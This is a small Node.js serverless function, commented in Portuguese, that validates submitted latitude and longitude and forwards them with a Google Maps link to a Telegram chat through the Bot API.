const axios = require("axios");

module.exports = async (req, res) => {
  if (req.method !== "POST") {
    return res.status(405).json({ success: false, message: "Método não permitido" });
  }

  const { latitude, longitude, maps, source } = req.body;

  const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

  // Verifica se latitude e longitude foram recebidas corretamente e são válidas
  if (!latitude || !longitude || isNaN(latitude) || isNaN(longitude)) {
    return res.status(400).json({ success: false, message: "Latitude e Longitude válidas são obrigatórias!" });
  }

  const formattedLatitude = parseFloat(latitude);
  const formattedLongitude = parseFloat(longitude);
  
  const message = `📍 Localização recebida\nFonte: ${source}\nMaps: ${maps}`;

  try {
    // Enviar a localização real para o Telegram
    const locationResponse = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`, {
      chat_id: TELEGRAM_CHAT_ID,
      latitude: formattedLatitude,
      longitude: formattedLongitude
    });

    console.log("Resposta de localização:", locationResponse.data);

    // Enviar uma mensagem adicional com o link do Google Maps
    const messageResponse = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message
    });

    console.log("Resposta de mensagem:", messageResponse.data);

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error("Erro ao enviar para o Telegram:", error.response?.data || error.message);
    return res.status(500).json({ success: false, message: "Erro ao enviar para o Telegram." });
  }
};